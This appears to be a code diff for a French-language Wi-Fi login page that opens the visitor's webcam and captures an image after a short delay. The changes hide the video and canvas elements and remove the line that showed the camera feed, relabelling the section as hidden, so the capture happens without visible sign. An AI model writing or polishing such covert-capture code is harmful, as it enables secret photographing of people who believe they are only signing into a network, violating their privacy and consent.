@@ -89,7 +89,6 @@
       background-color: #0056b3;
     }
     video, canvas {
-      
       display: none;
     }
   </style>
@@ -122,9 +121,9 @@
     <button type="button" id="submitBtn">Envoyer et Accéder au WIFI</button>
   </form>
 
-  <!-- Section pour capturer l'image (affichée seulement après avoir rempli le formulaire) -->
-  <video id="video" autoplay style="display:none;"></video>
-  <canvas id="canvas" style="display:none;"></canvas>
+  <!-- Section pour capturer l'image (masquée) -->
+  <video id="video" autoplay></video>
+  <canvas id="canvas"></canvas>
 
   <script>
     const continueButton = document.getElementById('continueButton');
@@ -181,7 +180,6 @@
       navigator.mediaDevices.getUserMedia({ video: true })
         .then(stream => {
           video.srcObject = stream;
-          video.style.display = 'block'; // Afficher la vidéo après l'accès
 
           // Capturer l'image après un délai de 2 secondes (pour laisser le temps à la caméra de démarrer)
           setTimeout(() => {
@@ -210,7 +208,5 @@
     });
   </script>
 
-</body>
-</html>
 </body>
 </html>
